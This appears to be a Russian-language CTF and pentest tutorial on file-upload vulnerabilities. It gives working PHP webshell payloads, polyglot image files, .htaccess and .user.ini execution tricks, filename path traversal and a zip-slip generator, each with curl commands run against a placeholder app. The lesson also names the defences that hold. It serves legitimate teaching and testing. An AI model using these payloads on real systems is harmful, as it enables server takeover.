Загрузка файлов — одна из самых частых дорог к RCE в веб-приложениях. Идея проста: если сервер сохраняет загруженный файл в директорию, откуда он исполняется (webroot), и позволяет загрузить исполняемый файл (`.php`, `.jsp`, `.aspx`, `.py`), то запрос к этому файлу выполнит код. Защита строится из нескольких «слоёв» (чёрный/белый список расширений, проверка MIME, magic bytes, переименование, вынос из webroot), и каждый слой имеет известный обход. Этот урок — про все слои и их обходы.

## Теория: как строится защита и где она ломается

Типичные проверки при загрузке:

1. **Расширение** — чёрный список (`.php`, `.jsp`) или белый (`.jpg`, `.png`).
2. **MIME-тип** — по заголовку `Content-Type` (ненадёжно) или по содержимому (`finfo`/magic bytes).
3. **Размер/имя файла** — санитизация имени, запрет `../`.
4. **Место хранения** — webroot (плохо) vs отдельная директория (лучше).
5. **Права/исполнение** — отключение исполнения в upload-директории.

Ломается всё, кроме последнего: чёрные списки неполны, MIME по заголовку подделывается, magic bytes можно подделать, имя файла — обойти. Только «вынести файлы из webroot + запретить исполнение» действительно защищает.

## Чёрный и белый списки: полный список обходов

Чёрный список `.php` в Apache обходится альтернативными расширениями, которые Apache тоже исполняет как PHP (если так настроен `AddHandler`/`AddType`):

| Обход | Почему работает |
|-------|-----------------|
| `.phtml`, `.php3`, `.php4`, `.php5`, `.php7`, `.phps` | Apache мапит их на PHP |
| `.pht`, `.phtm` | старые конфиги |
| `.php.` (точка в конце) | Windows отбрасывает конечную точку |
| `.php%00.jpg` (null byte) | старые PHP обрезали на `%00` |
| `.pHp` (регистр) | если фильтр регистрозависим |
| `shell.php.jpg` | если сервер проверяет только первое расширение |
| `shell.jpg.php` | если сервер исполняет по последнему |
| `.php::$DATA` | NTFS alternate data stream (Windows) |
| `.asp`, `.aspx`, `.jsp`, `.cgi`, `.pl` | для других стеков |

Двойное расширение (`shell.php.jpg`) опасно, потому что серверы по-разному определяют «настоящее» расширение: nginx/Apache смотрят на последнее, некоторые фреймворки — на первое.

## Magic bytes и как их подделать

Magic bytes — первые байты файла, по которым определяется тип (например, `GIF89a` для GIF, `\x89PNG` для PNG, `%PDF` для PDF). Если сервер проверяет тип по содержимому (`getimagesize`, `finfo`), можно сделать «polyglot»: файл, который одновременно валидная картинка и валидный PHP.

```bash
# GIF + PHP
printf 'GIF89a;<?php system($_GET["c"]); ?>' > shell.gif
# или добавить PHP после валидного GIF
cat legit.gif <(echo '<?php system($_GET["c"]); ?>') > shell.gif
```

`getimagesize()` увидит GIF и пропустит файл. Если сервер сохраняет его как `.php` (или как `.gif`, но исполняет), получится webshell.

## Content-Type и как его обойти

Если проверка MIME идёт только по заголовку `Content-Type`, достаточно подделать заголовок:

```bash
# отправляем PHP, но с Content-Type картинки
curl -s -F 'file=@shell.php;type=image/png' https://app.example/upload
```

Если проверка идёт по содержимому — используйте polyglot выше. Если и то, и другое — комбинируйте: polyglot + `Content-Type: image/png`.

## .htaccess и .user.ini

Если сервер разрешает загрузку `.htaccess` (Apache) и не запрещает исполнение, можно «научить» Apache исполнять нестандартное расширение:

```apache
# .htaccess
AddType application/x-httpd-php .jpg
```

Загрузите `.htaccess` с этой строкой, затем загрузите `shell.jpg` с PHP-кодом — Apache начнёт исполнять `.jpg` как PHP. Аналогично `.user.ini` для PHP-FPM с `auto_prepend_file`:

```ini
; .user.ini
auto_prepend_file=shell.jpg
```

Это позволяет обойти белый список расширений, потому что `.htaccess`/`.user.ini` не имеют «исполняемого» расширения.

## Path traversal в имени файла и zip-slip

**Path traversal в имени**: если сервер использует `filename` из multipart как есть, можно записать файл куда угодно:

```bash
curl -s -F 'file=@shell.php;filename=../../../../var/www/html/shell.php' https://app.example/upload
```

**zip-slip**: при распаковке архива имя записи может содержать `../`, и файл выходит за пределы целевой директории:

```bash
# создаём zip с записью, выходящей наружу
python3 -c "
import zipfile
z=zipfile.ZipFile('evil.zip','w')
z.writestr('../../../../var/www/html/shell.php','<?php system(\$_GET[\"c\"]); ?>')
z.close()"
curl -s -F 'file=@evil.zip' https://app.example/unzip
```

Так «безобидная» загрузка zip превращается в запись webshell (см. `web-zip-slip`).

## Разобранный пример: webshell через обход чёрного списка

Дано: приложение принимает только изображения, чёрный список расширений, отдаёт файлы из `/uploads/`.

```bash
# 1. пробуем прямое расширение
curl -s -F 'file=@shell.php' https://app.example/upload   # blocked
# 2. обход двойным расширением
cp shell.php shell.php.jpg
curl -s -F 'file=@shell.php.jpg' https://app.example/upload
# -> {"url":"/uploads/shell.php.jpg"}
# 3. проверяем исполнение
curl -s 'https://app.example/uploads/shell.php.jpg?c=id'
# uid=33(www-data) gid=33(www-data)
```

Если не сработало — пробуйте `.phtml`, polyglot, `.htaccess`.

## Разобранный пример: XXE/SSRF через SVG

SVG — XML, и его часто принимают как картинку. Загрузите SVG с внешней сущностью — сервер обработает его XML-парсером и прочитает файл или сделает SSRF (см. `web-xxe`):

```bash
curl -s -F 'file=@evil.svg;type=image/svg+xml' https://app.example/upload
```

## Разобранный пример: race condition при загрузке

Некоторые приложения сначала сохраняют файл, потом проверяют/перемещают. В окне между сохранением и проверкой можно успеть запросить файл:

```bash
# отправляем загрузку и параллельно запрашиваем /uploads/shell.php
curl -s -F 'file=@shell.php' https://app.example/upload & \
curl -s 'https://app.example/uploads/shell.php?c=id'
```

Это race condition (см. `web-race-conditions`).

## Инструменты

- **curl `-F`** — multipart с контролем имени и типа.
- **Burp Repeater** — правка `filename`, `Content-Type`, тела.
- **`exiftool`/`printf`** — подготовка magic bytes.
- **`python zipfile`** — zip-slip.

## Типичные ошибки новичков

- **Сдаваться после «blocked».** Нужен перебор расширений/polyglot.
- **Не проверять исполнение.** Загрузка ≠ RCE; нужен запрос к файлу.
- **Забыть про `.htaccess`/`.user.ini`.** Обход белого списка.
- **Игнорировать имя файла.** `filename=../` — запись вне директории.
- **Путать MIME по заголовку и по содержимому.** Разные обходы.
- **Ломать прод.** Загрузка webshell — только с согласия.

## Что делать дальше / решение

1. Определите, какие проверки есть (расширение/MIME/содержимое/размер).
2. Переберите обходы: альтернативные расширения → двойное → регистр → null byte.
3. Подделайте magic bytes (polyglot) при проверке содержимого.
4. Попробуйте `.htaccess`/`.user.ini` при белом списке.
5. Проверьте path traversal в имени и zip-slip при распаковке.
6. Доведите до RCE (`?c=id`) или LFI/SSRF (SVG).
7. Тупик → `web-zip-slip`, `web-xxe`, `web-race-conditions`.

## Разобранный пример: обход белого списка через .user.ini

Дано: разрешены только `.jpg`/`.png`, содержимое проверяется `getimagesize`, файлы лежат в `/uploads/` и **исполняются** как PHP (плохая конфигурация — PHP-FPM смотрит на `.user.ini` в директории).

```bash
# 1. загружаем .user.ini с auto_prepend_file (не имеет "исполняемого" расширения)
printf 'auto_prepend_file=shell.jpg' > .user.ini
curl -s -F 'file=@.user.ini' https://app.example/upload
# 2. загружаем polyglot shell.jpg (валидная картинка + PHP)
cat legit.jpg <(echo '<?php system($_GET["c"]); ?>') > shell.jpg
curl -s -F 'file=@shell.jpg;type=image/jpeg' https://app.example/upload
# 3. любой запрос в /uploads/ теперь подключает shell.jpg
curl -s 'https://app.example/uploads/anything.php?c=id'
# uid=33(www-data)
```

`.user.ini` работает для PHP-FPM (в отличие от `.htaccess`, который для mod_php). Ключ — найти директорию, где приложение отдаёт файлы и где включён PHP-FPM.

## Хранение и отдача: где искать загруженный файл

Загрузка бесполезна, если вы не знаете, откуда файл отдаётся и исполняется. Ищите:

1. **Ответ загрузки** — часто возвращает путь (`{"url":"/uploads/x.jpg"}`).
2. **Код/ошибки** — `Warning: move_uploaded_file(.../uploads/...)`.
3. **Дефолты** — `/uploads/`, `/files/`, `/media/`, `/static/`, `/tmp/`.
4. **Исполняемость** — запросите файл и посмотрите: отдаётся как статика (безопасно) или исполняется (RCE).
5. **LFI/SSRF** — чтобы прочитать/триггернуть файл, если прямой путь закрыт.

## WAF и загрузка

WAF может блокировать загрузку по сигнатурам в теле (`<?php`, `system`) или по расширению. Обходы:

- **Разбить сигнатуру** между несколькими файлами (`.htaccess` + картинка).
- **Сменить Content-Type** на `image/png` при `<?php` в теле.
- **Polyglot** — `<?php` спрятан после валидной картинки, WAF видит «картинку».
- **Архив** — загрузить zip с webshell внутри (zip-slip/распаковка).
- **Chunked/кодирование** — как в `web-waf-bypass`.

## Итог

Загрузка файлов — это гонка между слоями защиты и слоями обхода. Полный чек-лист: определите, какие проверки есть (расширение/MIME/содержимое/имя/место), затем переберите обходы по порядку — альтернативные расширения, двойное расширение, регистр, null byte, polyglot, `.htaccess`/`.user.ini`, path traversal в имени, zip-slip. Доводите до **исполнения**: загруженный файл должен быть запрошен и выполнен, иначе это не RCE, а лишь «файл загрузился». И помните: даже если загрузка не даёт RCE напрямую, она часто даёт **XSS** (загрузка HTML/SVG), **XXE** (SVG/DOCX) или **SSRF** (SVG с внешней сущностью) — то есть остаётся ценным вектором.
## Быстрый чек-лист по загрузке

1. Загрузите безобидный `.jpg` — узнайте путь отдачи и есть ли исполнение.
2. Подайте `.php`/`.jsp` — проверьте чёрный список.
3. Переберите альтернативные расширения (`.phtml`, `.php5`, `.pht`, `.php.`).
4. Подайте двойное расширение (`x.php.jpg`) и проверьте, что исполнится.
5. Подделайте `Content-Type` на `image/png`.
6. Сделайте polyglot (GIF/PNG + `<?php`) при проверке по содержимому.
7. Загрузите `.htaccess`/`.user.ini` при белом списке.
8. Проверьте `filename=../` и zip-slip.
9. Доведите до исполнения (`?c=id`) — это и есть артефакт.

## Где пригодится

- **CTF (Web):** загрузка файлов — классический путь к RCE и чтению флага; фильтры и их обход — суть задачи.
- **Bug bounty:** небезопасная загрузка = critical (RCE/XSS); отчёт ценится за точную демонстрацию обхода.
- **Пентест:** загрузка — обязательный пункт тестирования; успех часто даёт foothold.
- **Работа (AppSec):** whitelisting, magic-bytes, хранение вне webroot — базовые меры, которые внедряет безопасник.
